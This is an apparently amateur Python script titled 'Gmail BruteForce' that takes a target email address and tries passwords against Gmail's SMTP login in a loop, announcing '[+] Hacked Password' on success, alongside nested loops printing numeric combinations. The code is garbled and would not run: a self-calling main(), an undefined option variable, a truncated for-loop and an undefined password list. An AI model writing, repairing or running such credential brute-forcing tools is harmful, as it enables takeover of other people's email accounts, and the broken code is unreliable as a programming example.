
#!/usr/bin/python
'''Gmail BruteForce'''

import smtplib
from os import system

def main():
	main()
print ("[1] start the attack")
print ("[2] exit")
if option == 1:
           for i in range(0,10):
		 for j in range(0,10):
		 	for k in range(0,10):
		 		for l in range(0,10):
		 			for m in range(0,10):
		 				for o in range(0,10):
		 					for p in range(0,10):
		 						for q in range(0,10):
		 							for r in range(0,10):
		 								for s in range(0,10):
		 									print("",i,j,k,l,m,o,p,q,r,s)
		 					
		 				
		 			
		 		
		 	
		 

def login():
    i = 0
    user_name = raw_input('target email :')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in 
     i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] Hacked Password :' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] Hacked Password :' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
